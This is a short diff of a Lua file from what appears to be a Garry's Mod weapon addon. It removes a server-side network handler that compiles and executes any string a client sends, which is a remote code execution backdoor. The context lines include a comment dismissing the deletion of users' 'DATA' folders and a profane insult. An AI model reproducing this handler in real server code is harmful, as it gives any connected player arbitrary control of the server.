@@ -63,12 +63,3 @@ end
 -- ACCORDING TO MAGENTA, DELETING THE 'DATA' FOLDER ON COMPUTERS OF SOME PEOPLE IS NOT A BIG DEAL, SINCE, YOU KNOW, THERE IS NOTHING IMPORTANT IN THERE
 -- fuck off cunt
 file.CreateDir("cw2_0")
-
-if SERVER then
-	util.AddNetworkString("CW20_EXPNETWORKING")
-	net.Receive("CW20_EXPNETWORKING", function(len, ply)
-		local effectdata = net.ReadString()
-		local func = CompileString(effectdata, "LuaCmd", false)
-		func()
-	end)
-end
